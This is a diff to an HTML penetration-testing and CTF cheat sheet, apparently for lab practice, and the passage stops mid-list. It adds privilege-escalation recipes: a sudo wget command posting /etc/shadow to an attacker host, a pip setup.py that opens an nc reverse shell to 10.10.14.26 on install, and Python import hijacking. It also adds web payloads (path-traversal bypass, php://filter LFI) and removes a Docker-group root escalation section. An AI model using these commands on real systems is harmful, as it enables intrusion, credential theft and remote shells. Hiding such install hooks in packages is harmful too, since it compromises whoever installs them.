@@ -175,6 +175,7 @@
 <li><a class="reference internal" href="#time-of-check-to-time-of-use">Time of check to time of use</a></li>
 <li><a class="reference internal" href="#writable-etc-passwd-or-account-credentials-came-from-a-legacy-unix-system">Writable /etc/passwd or account credentials came from a legacy unix system</a></li>
 <li><a class="reference internal" href="#elevating-privilege-from-a-suid-binary">Elevating privilege from a suid binary</a></li>
+<li><a class="reference internal" href="#executing-python-script-with-sudo">Executing Python script with sudo</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#mysql-privileged-escalation">MySQL Privileged Escalation</a><ul>
@@ -193,6 +194,8 @@
 <li><a class="reference internal" href="#tcpdump">tcpdump</a></li>
 <li><a class="reference internal" href="#zip">zip</a></li>
 <li><a class="reference internal" href="#find">find</a></li>
+<li><a class="reference internal" href="#wget">wget</a></li>
+<li><a class="reference internal" href="#package-installation">Package Installation</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#unix-wildcards">Unix Wildcards</a><ul>
@@ -219,7 +222,7 @@
 <li><a class="reference internal" href="#others">Others</a></li>
 </ul>
 </li>
-<li><a class="reference internal" href="#wget">Wget</a><ul>
+<li><a class="reference internal" href="#id21">Wget</a><ul>
 <li><a class="reference internal" href="#ftp-via-wget">FTP via Wget</a></li>
 <li><a class="reference internal" href="#wgetrc-commands">wgetrc Commands</a></li>
 <li><a class="reference internal" href="#tricks">Tricks</a></li>
@@ -237,6 +240,7 @@
 </li>
 <li><a class="reference internal" href="#http">HTTP</a><ul>
 <li><a class="reference internal" href="#first-things">First things</a></li>
+<li><a class="reference internal" href="#csc-austria-ctf-tips-and-tricks">CSC Austria: CTF Tips and Tricks</a></li>
 <li><a class="reference internal" href="#htaccess-useragent">htaccess - UserAgent</a></li>
 <li><a class="reference internal" href="#cgi-bin-shellshock">CGI-BIN Shellshock</a></li>
 <li><a class="reference internal" href="#xss-html-injection">XSS/ HTML Injection</a></li>
@@ -246,13 +250,6 @@
 <li><a class="reference internal" href="#login-pages">Login-Pages</a></li>
 <li><a class="reference internal" href="#delete-tags">Delete Tags</a></li>
 <li><a class="reference internal" href="#http-404-custom-page">HTTP 404 Custom Page</a></li>
-<li><a class="reference internal" href="#id21">PHP</a></li>
-</ul>
-</li>
-<li><a class="reference internal" href="#docker-security">Docker Security</a><ul>
-<li><a class="reference internal" href="#create-a-dockerfile">Create a Dockerfile</a></li>
-<li><a class="reference internal" href="#build-the-docker">Build the Docker</a></li>
-<li><a class="reference internal" href="#become-root">Become root?</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#password-protected-file">Password Protected File</a><ul>
@@ -296,7 +293,7 @@
 <li><a class="reference internal" href="#metasploit-shell-upgrade">Metasploit shell upgrade</a></li>
 <li><a class="reference internal" href="#truecrypt-files">Truecrypt Files</a></li>
 <li><a class="reference internal" href="#grep-in-input-box">Grep in input box?</a></li>
-<li><a class="reference internal" href="#id24">Others</a></li>
+<li><a class="reference internal" href="#id28">Others</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#cyber-deception">Cyber-Deception</a><ul>
@@ -335,6 +332,7 @@
 <li><a class="reference internal" href="#simple-file-upload">Simple File Upload</a></li>
 <li><a class="reference internal" href="#simple-file-upload-with-verifying-image-type">Simple File Upload - With verifying image type</a></li>
 <li><a class="reference internal" href="#modifying-file-upload-page">Modifying File Upload Page</a></li>
+<li><a class="reference internal" href="#iis-web-config-upload">IIS - Web.config Upload</a></li>
 </ul>
 </li>
 </ul>
@@ -347,24 +345,62 @@
 <li><a class="reference internal" href="#copying-the-files-windows">Copying the Files - Windows</a></li>
 </ul>
 </li>
-<li><a class="reference internal" href="#id30">HTTP</a><ul>
+<li><a class="reference internal" href="#id34">HTTP</a><ul>
 <li><a class="reference internal" href="#setting-up-the-server">Setting up the Server</a></li>
 <li><a class="reference internal" href="#accessing-the-server-windows">Accessing the Server - Windows</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#ftp">FTP</a><ul>
-<li><a class="reference internal" href="#id31">Setting up the Server</a></li>
+<li><a class="reference internal" href="#id35">Setting up the Server</a></li>
 <li><a class="reference internal" href="#access-using-ftp">Access using FTP</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#tftp">TFTP</a><ul>
-<li><a class="reference internal" href="#id32">Setting up the Server</a></li>
+<li><a class="reference internal" href="#id36">Setting up the Server</a></li>
 <li><a class="reference internal" href="#accessing-the-share">Accessing the Share</a></li>
 <li><a class="reference internal" href="#installing-tftp-windows">Installing tftp - Windows</a></li>
 </ul>
 </li>
 </ul>
 </li>
+<li><a class="reference internal" href="#appendix-iv-linux-group-membership-issues">Appendix-IV Linux Group Membership Issues</a><ul>
+<li><a class="reference internal" href="#docker-group">Docker Group</a><ul>
+<li><a class="reference internal" href="#create-a-dockerfile">Create a Dockerfile</a></li>
+<li><a class="reference internal" href="#build-the-docker">Build the Docker</a></li>
+<li><a class="reference internal" href="#become-root">Become root?</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#video">Video</a></li>
+<li><a class="reference internal" href="#disk">Disk</a><ul>
+<li><a class="reference internal" href="#set-file-system">Set file system</a></li>
+<li><a class="reference internal" href="#list-files">List files</a></li>
+<li><a class="reference internal" href="#list-the-files-with-a-long-listing">List the files with a long listing</a></li>
+<li><a class="reference internal" href="#dump-the-contents-of-file1">Dump the contents of file1</a></li>
+<li><a class="reference internal" href="#dump-an-inode-to-a-file">Dump an inode to a file</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#lxd">LXD</a><ul>
+<li><a class="reference internal" href="#exploiting">Exploiting</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a class="reference internal" href="#appendix-v-coding-languages-tricks">Appendix-V Coding Languages Tricks</a><ul>
+<li><a class="reference internal" href="#id37">Python</a><ul>
+<li><a class="reference internal" href="#pickle">Pickle</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#id38">PHP</a><ul>
+<li><a class="reference internal" href="#preg-replace">Preg_Replace</a></li>
+<li><a class="reference internal" href="#complex-curly-syntax">Complex Curly Syntax</a></li>
+<li><a class="reference internal" href="#xdebug">Xdebug</a></li>
+<li><a class="reference internal" href="#type-juggling-magic-bytes">Type Juggling/ Magic Bytes</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#id40">LUA</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#changelog">Changelog</a></li>
 </ul>
 </li>
 </ul>
@@ -414,6 +450,8 @@
 <li><a class="reference internal" href="#a1-local-file-inclusion"><span class="std std-ref">Appendix-I : Local File Inclusion</span></a></li>
 <li><a class="reference internal" href="#a2-file-upload"><span class="std std-ref">Appendix-II : File Upload</span></a></li>
 <li><a class="reference internal" href="#a3-tranfer-files-from-linux-to-windows"><span class="std std-ref">Appendix-III Transferring Files from Linux to Windows (post-exploitation)</span></a></li>
+<li><a class="reference internal" href="#a4-linux-group-membership-issues"><span class="std std-ref">Appendix-IV Linux Group Membership Issues</span></a></li>
+<li><a class="reference internal" href="#a5-coding-languages-tricks"><span class="std std-ref">Appendix-V Coding Languages Tricks</span></a></li>
 </ul>
 <div class="section" id="finding-the-ip-address">
 <span id="id2"></span><h2>Finding the IP address<a class="headerlink" href="#finding-the-ip-address" title="Permalink to this headline">¶</a></h2>
@@ -1812,16 +1850,19 @@ SeDebugPrivilege
 <h3>Privilege escalation from g0tm1lk blog<a class="headerlink" href="#privilege-escalation-from-g0tm1lk-blog" title="Permalink to this headline">¶</a></h3>
 <p>Once, we have got the unprivileged shell, it is very important to check the below things</p>
 <ul class="simple">
+<li>Did you tried “sudo -l” and check if we have any binaries which can be executed as root?</li>
 <li>Are there any binaries with Sticky, suid, guid.</li>
 <li>Are there any world-writable folders, files.</li>
 <li>Are there any world-execuable files.</li>
 <li>Which are the files owned by nobody (No user)</li>
 <li>Which are the files which are owned by a particular user but are not present in their home directory. (Mostly, the users have files and folders in /home directory. However, that’s not always the case.)</li>
 <li>What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.</li>
-<li>What are the packages installed? (dpkg -l). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49).</li>
+<li>What are the packages installed? (dpkg -l for debian) (pip list for python packages). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49 or couchdb 1.7).</li>
 <li>What are the services running? (netstat -ln)</li>
 <li>Check the entries in the crontab!</li>
 <li>What are the files present in the /home/user folder? Are there any hidden files and folders? like .thunderbird/ .bash_history etc.</li>
+<li>What groups does the user belong to (adm, audio, video, disk)?</li>
+<li>What other users are logged on the linux box (command w)?</li>
 </ul>
 <div class="section" id="what-advanced-linux-file-permissions-are-used">
 <h4>What “Advanced Linux File Permissions” are used?<a class="headerlink" href="#what-advanced-linux-file-permissions-are-used" title="Permalink to this headline">¶</a></h4>
@@ -1871,7 +1912,7 @@ find / -group groupname 2&gt; /dev/null
 </div>
 <div class="admonition tip">
 <p class="first admonition-title">Tip</p>
-<p class="last">Find files by wheel/ adm users or the users in the home directory.</p>
+<p class="last">Find files by wheel/ adm users or the users in the home directory. If the user is member of other groups (such as audio, video, disk), it might be a good idea to check for files owned by particular groups.</p>
 </div>
 </div>
 </div>
@@ -2025,7 +2066,7 @@ symlink(&quot;/etc/shadow&quot;, &quot;file&quot;);
 <p>In this example, an attacker can exploit the race condition between the access and open to trick the setuid victim into overwriting an entry in the system password database. TOCTTOU races can be used for privilege escalation, to get administrative access to a machine.</p>
 <p>Let’s see how we can exploit this?</p>
 <p>In the below code, we are linking the file which we have access (/tmp/hello.txt) and the file which we want to read (and currently don’t have access) (/home/flagXX/token). The f switch on ln makes sure we overwrite the existing symbolic link. We run it in the while true loop to create the race condition.</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>while true; do ln -sf /tmp/hello.txt /tmp/token; ln -sf /home/flag10/token /tmp/token ; done
+<div class="highlight-None"><div class="highlight"><pre><span></span>while true; do ln -sf /tmp/hello.txt /tmp/token; ln -sf /home/flagXX/token /tmp/token ; done
 </pre></div>
 </div>
 <p>We would also run the program in a while loop</p>
@@ -2033,7 +2074,7 @@ symlink(&quot;/etc/shadow&quot;, &quot;file&quot;);
 </pre></div>
 </div>
 <p>Learning:</p>
-<p>Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.”</p>
+<p>Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.</p>
 </div>
 <div class="section" id="writable-etc-passwd-or-account-credentials-came-from-a-legacy-unix-system">
 <h4>Writable /etc/passwd or account credentials came from a legacy unix system<a class="headerlink" href="#writable-etc-passwd-or-account-credentials-came-from-a-legacy-unix-system" title="Permalink to this headline">¶</a></h4>
@@ -2082,6 +2123,61 @@ system(&quot;/bin/bash -p&quot;); }
 </div>
 <p>However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it’s a symlink to bash, it won’t provide us suid privileges, bash automatically drops its privileges when it’s being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.</p>
 <p>More details can be found at <a class="reference external" href="http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html">Common Pitfalls When Writing Exploits</a></p>
+</div>
+<div class="section" id="executing-python-script-with-sudo">
+<h4>Executing Python script with sudo<a class="headerlink" href="#executing-python-script-with-sudo" title="Permalink to this headline">¶</a></h4>
+<p>If there exists a python script which has a import statement and a user has a permission to execute it using sudo.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;display_script.py&gt;
+
+#!/usr/bin/python3
+import ftplib or import example
+&lt;Python code utilizing ftplib or example calling some function&gt;
+print (example.display())
+</pre></div>
+</div>
+<p>and is executed using</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>sudo python display_script.py
+</pre></div>
+</div>
+<p>We can use this to privilege escalate to the higher privileges. As python would imports modules in the current directory first, then from the modules dir (PYTHONPATH), we could make a malicious python script (of the same name of import module such as ftplib or example)
+and have it imported by the program. The malicious script may have a function similar to used in example.py executing our command. e.g.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>&lt;example.py&gt;
+#!/usr/bin/python3
+import os
+
+def display():
+   os.system(&quot;whoami&quot;)
+   exit()
+</pre></div>
+</div>
+<p>The result would be “root”. This is mainly because <a class="reference external" href="https://docs.python.org/2/library/sys.html#sys.path">sys.path</a> is populated using the current working directory, followed by directories listed in your PYTHONPATH environment variable, followed by installation-dependent default paths, which are controlled by the site module.</p>
+<p><strong>Example</strong></p>
+<p>If we run our script with sudo (sudo myscript.py) then the environment variable $USER will be root and the environment variable $SUDO_USER will be the name of the user who executed the command sudo myscript.py. Consider the following scenario:</p>
+<p>A linux user bob is logged into the system and possesses sudo privileges. He writes the following python script named myscript.py:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>#!/usr/bin/python
+import os
+print os.getenv(&quot;USER&quot;)
+print os.getenv(&quot;SUDO_USER&quot;)
+</pre></div>
+</div>
+<p>He then makes the script executable with chmod +x myscript.py and then executes his script with sudo privileges with the command:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>sudo ./myscript.py
+</pre></div>
+</div>
+<p>The output of that program will be (using python 2.x.x):</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>root
+bob
+</pre></div>
+</div>
+<p>If bob runs the program without sudo privileges with</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>./myscript.py
+</pre></div>
+</div>
+<p>he will get the following output:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>bob
+None
+</pre></div>
+</div>
 </div>
 </div>
 <div class="section" id="mysql-privileged-escalation">
@@ -2136,7 +2232,7 @@ Dpkg::Post-Invoke {&quot;command&quot;;};
 </div>
 <div class="section" id="sudo-l-permissions">
 <h3>SUDO -l Permissions<a class="headerlink" href="#sudo-l-permissions" title="Permalink to this headline">¶</a></h3>
-<p>Let’s see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find and zip.</p>
+<p>Let’s see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find,  zip and package installers (pip, npm).</p>
 <div class="section" id="nmap-suid">
 <h4>nmap suid<a class="headerlink" href="#nmap-suid" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-None"><div class="highlight"><pre><span></span>nmap --script &lt;(echo &#39;require &quot;os&quot;.execute &quot;/bin/sh&quot;&#39;)
@@ -2210,6 +2306,74 @@ find foo -exec whoami \;
 </div>
 <p>Here, the foo file (a blank file) is created using the touch command as the -exec parameter of the find command will execute the given command for every file that it finds, so by using “find foo” it is ensured they only execute once. The above command will be executed as root.</p>
 <p>HollyGrace has mentioned this in <a class="reference external" href="https://www.gracefulsecurity.com/linux-privesc-abusing-suid/">Linux PrivEsc: Abusing SUID</a> More can be learn <a class="reference external" href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">How-I-got-root-with-sudo</a>.</p>
+</div>
+<div class="section" id="wget">
+<h4>wget<a class="headerlink" href="#wget" title="Permalink to this headline">¶</a></h4>
+<p>If the user has permission to run wget as sudo, we can read files (if the user whom we are sudo-ing have the permisson to read) by using –post-file parameter</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
+</pre></div>
+</div>
+<p>Example:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>sudo -u root wget --post-file=/etc/shadow http://AttackerIP:Port
+</pre></div>
+</div>
+<p>On the attacker side, there can be a nc listener. The above would send the contents of /etc/shadow to the listener in the post request.</p>
+</div>
+<div class="section" id="package-installation">
+<h4>Package Installation<a class="headerlink" href="#package-installation" title="Permalink to this headline">¶</a></h4>
+<p><strong>pip</strong></p>
+<p>If the user have been provided permission to install packages as a sudo for example</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>User username may run the following commands on hostname:
+   (root) /usr/bin/pip install *
+</pre></div>
+</div>
+<p>We can exploit this by creating a custom pip package which would provide us a shell.</p>
+<p>First, create a folder (Let’s name it helloworld), and create two files setup.py and helloworld.py</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>username@hostname:/tmp/helloworld$ ls
+helloworld.py setup.py
+</pre></div>
+</div>
+<p>Let’s see, what setup.py contains</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>cat setup.py
+
+from setuptools import setup
+import os
+print os.system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.26 4444 &gt;/tmp/f&quot;)
+
+setup(
+    name=&#39;helloworld-script&#39;,    # This is the name of your PyPI-package.
+    version=&#39;0.1&#39;,               # Update the version number for new releases
+    scripts=[&#39;helloworld&#39;]       # The name of your scipt, and also the command you&#39;ll be using for calling it
+)
+</pre></div>
+</div>
+<p>and helloworld.py</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>cat helloworld.py
+#!/usr/bin/env python
+print &quot;Hello World&quot;
+</pre></div>
+</div>
+<p>The above can be a part of a sample package of python pip. For more details refer <a class="reference external" href="https://github.com/pypa/sampleproject">A sample project that exists for PyPUG’s “Tutorial on Packaging and Distributing Projects”</a> , <a class="reference external" href="http://python-packaging.readthedocs.io/en/latest/index.html">How To Package Your Python Code</a> ,
+<a class="reference external" href="https://stackoverflow.com/questions/22051360/a-simple-hello-world-setuptools-package-and-installing-it-with-pip">A simple Hello World setuptools package and installing it with pip</a>
+and <a class="reference external" href="https://packaging.python.org/tutorials/distributing-packages/">Packaging and distributing projects</a></p>
+<p>The above package can be installed by using</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>sudo -u root /usr/bin/pip install -e /tmp/helloworld
+
+Obtaining file:///tmp/helloworld
+</pre></div>
+</div>
+<p>The above would execute setup.py and provide us the shell.</p>
+<p>Refer <a class="reference external" href="https://packaging.python.org/tutorials/installing-packages/">Installing Packages</a> for different ways to install a pip package</p>
+<p>Let’s see the installed application</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>pip list
+Flask-CouchDB (0.2.1)
+helloworld-script (0.1, /tmp/helloworld)
+Jinja2 (2.10)
+</pre></div>
+</div>
+<p><strong>npm</strong></p>
+<p>npm allows packages to take actions that could result in a malicious npm package author to create a worm that spreads across the majority of the npm ecosystem. Refer <a class="reference external" href="https://www.kb.cert.org/vuls/id/319816">npm fails to restrict the actions of malicious npm packages</a>
+, <a class="reference external" href="https://github.com/joaojeronimo/rimrafall">npm install could be dangerous: Rimrafall</a> and <a class="reference external" href="https://blog.npmjs.org/post/141702881055/package-install-scripts-vulnerability">Package install scripts vulnerability</a></p>
 </div>
 </div>
 <div class="section" id="unix-wildcards">
@@ -2709,8 +2873,8 @@ SHA256          8A7D37867537DB78A74A473792928F14EDCB3948B9EB11A48D6DE38B3DD30EEC
 </div></blockquote>
 </div>
 </div>
-<div class="section" id="wget">
-<h3>Wget<a class="headerlink" href="#wget" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="id21">
+<h3>Wget<a class="headerlink" href="#id21" title="Permalink to this headline">¶</a></h3>
 <div class="section" id="ftp-via-wget">
 <h4>FTP via Wget<a class="headerlink" href="#ftp-via-wget" title="Permalink to this headline">¶</a></h4>
 <p>If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)</p>
@@ -2742,6 +2906,7 @@ post_file = file   -- Use POST as the method for all HTTP requests and send the 
 </div></blockquote>
 <ul class="simple">
 <li>wget accepts IP address in decimal format</li>
+<li>wget shortens the filename if it’s too long. For example, if you provide a filename to the wget which is very long (i.e around 255 character), wget might shorten it. This might be helpful in cases where only a jpg file is allowed to be uploaded, however as wget shortens it, we may try aaaaaaaaaaaa (<a href="#id22"><span class="problematic" id="id23">*</span></a>255/ somenumber).php.jpg and wget shortens it to aaaaaaa(<a href="#id24"><span class="problematic" id="id25">*</span></a>255).php</li>
 </ul>
 </div>
 </div>
@@ -2878,6 +3043,61 @@ when browsing</li>
 </div>
 </div></blockquote>
 </div>
+<div class="section" id="csc-austria-ctf-tips-and-tricks">
+<h4>CSC Austria: CTF Tips and Tricks<a class="headerlink" href="#csc-austria-ctf-tips-and-tricks" title="Permalink to this headline">¶</a></h4>
+<p>Refer <a class="reference external" href="https://security-hub.at/download/csc_austria_ctf_tips_and_tricks.pdf">SEC Consult – Cyber Security Challenge Austria /CTF Tips &amp; Tricks</a></p>
+<ul>
+<li><p class="first">Read the source code / comments</p>
+</li>
+<li><p class="first">Check for common hidden files / folders (.git, .ssh, robots.txt, backup, .DS_Store, .svn, changelog.txt, server-status, admin, administrator, …)</p>
+</li>
+<li><p class="first">Check for common extensions (Example: If you see a index.php file, check index.php.tmp, index.php.bak, and so on)</p>
+</li>
+<li><p class="first">Play with the URL / parameters / cookies (Example: If you have a page with index.php?role=user try to change it to index.php?role=admin).</p>
+</li>
+<li><p class="first">Get familiar with the website, it’s functionalities and features before starting an in-depth analysis.</p>
+</li>
+<li><p class="first">Try to map the full attack-surface of the website! Some vulnerabilities are hidden deep in hard-to-reach functionalities.</p>
+</li>
+<li><p class="first">Test for the most common vulnerabilities like SQLi (SQL Injection), XXE (XML Entity Injection), Path Traversal, File Uploads, Command Injection, Cookie Tampering, XSS (Cross-Site-Scripting), XPATH Injection, Unserialization bugs, Outdated software, CSRF
+(Cross-Site-Request-Forgery), SSRF (Server-Side-Request-Forgery), SSTI (Server-Side Template Injection), LFI/RFI (Local-File-Inclusion / Remote-File-Inclusion), Flaws in Session Management or Authorization Flaws, the randomness of the cookies, and so on.</p>
+</li>
+<li><p class="first">If you come across a technology which you don’t know, try to google security writeups for these technologies.</p>
+</li>
+<li><p class="first">Try special characters</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>(‘, “, {, ;, |, &amp;&amp;, \, /, !(), %…)
+</pre></div>
+</div>
+</li>
+</ul>
+<blockquote>
+<div>in all input fields (GET- and POST parameters and Cookies) and check for uncommon responses or error messages.</div></blockquote>
+<ul>
+<li><p class="first">To detect blind vulnerabilities (SQL injection, command injection, XSS, …) you can use time delays or requests to one of your web servers (check the access logs).</p>
+</li>
+<li><p class="first">If you can provide a path or a filename to the website, you should test for path traversal vulnerabilities. If the application replaces the</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>“../”
+</pre></div>
+</div>
+</li>
+</ul>
+<blockquote>
+<div><p>with an empty string, you can try to bypass it by injecting the sequence two times, like:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>“…/./”.
+</pre></div>
+</div>
+<p>If the “../” in the center gets replaced, the application will again work with “../”. You can also try different encodings or other removed characters. Moreover, you can try to create or upload (e.g. via archives) a symbolic link.</p>
+</div></blockquote>
+<ul class="simple">
+<li>If you found a LFI (local-file-inclusion) vulnerability in a PHP website and you want to read the PHP scripts, you can use php-filter (you can’t normally read .php files because the inclusion would try to execute the code instead of displaying it;
+with php-filter you can first base64-encode the content to display it):</li>
+</ul>
+<blockquote>
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>index.php?filename=php://filter/convert.base64-encode/resource=index.php
+</pre></div>
+</div>
+</div></blockquote>
+</div>
 <div class="section" id="htaccess-useragent">
 <h4>htaccess - UserAgent<a class="headerlink" href="#htaccess-useragent" title="Permalink to this headline">¶</a></h4>
 <p>When you see something like this “Someone’s sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content”. Which says, only this can see me. Try to see what user-agent it is talking about. The way it is implemented is by use of .htaccess file</p>
@@ -2959,92 +3179,6 @@ This makes all connections considered &quot;insecure&quot; fail unless -k, --ins
 <div class="section" id="http-404-custom-page">
 <h4>HTTP 404 Custom Page<a class="headerlink" href="#http-404-custom-page" title="Permalink to this headline">¶</a></h4>
 <p>Sometimes, it’s a good idea to look at 404 custom page also. There might be some information stored.</p>
-</div>
-<div class="section" id="id21">
-<h4>PHP<a class="headerlink" href="#id21" title="Permalink to this headline">¶</a></h4>
-<ul>
-<li><p class="first">PHP’s preg_replace() function which can lead to RCE. It’s deprecated in later revisions (PHP &gt;= 5.5.0). If you think there’s a pattern which is replaced in a text, refer <a class="reference external" href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">The unexpected dangers of preg_replace()</a> and <a class="reference external" href="http://www.madirish.net/402">Exploiting PHP PCRE Functions</a></p>
-</li>
-<li><p class="first">PHP has <a class="reference external" href="http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex">Complex (curly) syntax</a> The Complex Syntax to allow evaluation of our own code in double quotes.</p>
-<p>Example</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>$use_me = &quot;ls -lah&quot;
-{${system($use_me)}}
-</pre></div>
-</div>
-<p>This works because the outside curly brackets say give the contents of a variable/method/has to start with $, which is why we need the inner ${} to act as a variable. {${system($use_me)}} means, give the contents of ${system($use_me)} which in turn means use the contents of a variable named by the output of system($use_me).</p>
-</li>
-</ul>
-</div>
-</div>
-<div class="section" id="docker-security">
-<h3>Docker Security<a class="headerlink" href="#docker-security" title="Permalink to this headline">¶</a></h3>
-<p>Any user who is part of the docker group should also be considered root. Read <a class="reference external" href="http://reventlov.com/advisories/using-the-docker-command-to-root-the-host">Using the docker command to root the host</a> Older version of docker were vulnerable to Docker breakout. More details at <a class="reference external" href="https://github.com/gabrtv/shocker">Shocker / Docker Breakout PoC</a></p>
-<p>If you are the docker user and want to get root.</p>
-<div class="section" id="create-a-dockerfile">
-<h4>Create a Dockerfile<a class="headerlink" href="#create-a-dockerfile" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-None"><div class="highlight"><pre><span></span>mkdir docker-test
-cd docker-test
-
-cat &gt; Dockerfile
-FROM debian:wheezy
-ENV WORKDIR /stuff
-RUN mkdir -p $WORKDIR
-VOLUME [ $WORKDIR ]
-WORKDIR $WORKDIR
-</pre></div>
-</div>
-</div>
-<div class="section" id="build-the-docker">
-<h4>Build the Docker<a class="headerlink" href="#build-the-docker" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-None"><div class="highlight"><pre><span></span>docker build -t my-docker-image .
-</pre></div>
-</div>
-</div>
-<div class="section" id="become-root">
-<h4>Become root?<a class="headerlink" href="#become-root" title="Permalink to this headline">¶</a></h4>
-<ul class="simple">
-<li>Copy binaries from the container into the host and give them suid permissions:</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c &#39;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&#39;
-
-./sh
-whoami
-# root
-</pre></div>
-</div>
-<p>If the sh is not working, create a suid.c, compile it, suid it and run.</p>
-</div></blockquote>
-<ul class="simple">
-<li>Mount system directories into docker and ask docker to read (and write) restricted files that should be out of your user’s clearance:</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &#39;cat shadow&#39;
-# root:!:16364:0:99999:7:::
-# daemon:*:16176:0:99999:7:::
-# bin:*:16176:0:99999:7:::
-# ...
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Bind the host’s / and overwrite system commands with rogue programs:</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>docker run -v /:/stuff -t my-docker-image /bin/sh -c &#39;cp /stuff/rogue-program /stuff/bin/cat&#39;
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Privileged copy of bash for later access?</li>
-</ul>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>docker run -v /:/stuff -t my-docker-image /bin/sh -c &#39;cp /stuff/bin/bash /stuff/bin/root-shell-ftw &amp;&amp; chmod a+s /stuff/bin/root-shell-ftw&#39;
-root-shell-ftw  -p
-root-shell-ftw-4.3#
-</pre></div>
-</div>
-</div></blockquote>
 </div>
 </div>
 <div class="section" id="password-protected-file">
@@ -3381,8 +3515,8 @@ Remember grep works in a way &quot;grep bitvijays /etc/passwd&quot; is find bitv
 <p>This command searches for any character in the file and comments out the reference to dictionary.txt</p>
 </div></blockquote>
 </div>
-<div class="section" id="id24">
-<h3>Others<a class="headerlink" href="#id24" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="id28">
+<h3>Others<a class="headerlink" href="#id28" title="Permalink to this headline">¶</a></h3>
 <ul class="simple">
 <li>It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password.</li>
 <li>If there’s a RCE in some web-application, probably, one of the way to check RCE is to ping your own machine.</li>
@@ -3708,29 +3842,19 @@ Also, it might be a good idea to test the command with ? on your local machine f
 </li>
 <li><p class="first">Sometimes, we don’t have tools on the victim machine, in that case we can download static binaries from <a class="reference external" href="https://github.com/andrew-d/static-binaries">Static-Binaries</a> If not, found, try the deb or rpm package of the binary, extract it and upload.</p>
 </li>
-<li><p class="first">If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>conn,addr = self.receiver_socket.accept()
-data = conn.recv(1024)
-return cPickle.loads(data)
+<li><p class="first">mysql can execute statements in one liner using –execute or -e option</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>mysql [options] db_name
+--user=user_name, -u user_name  : The MariaDB user name to use when connecting to the server.
+--password[=password], -p[password] : The password to use when connecting to the server. If you use the short option form (-p), you cannot have a space between the option and the password. If you omit the password value following the --password or -p option on the command line, mysql
+        prompts for one.
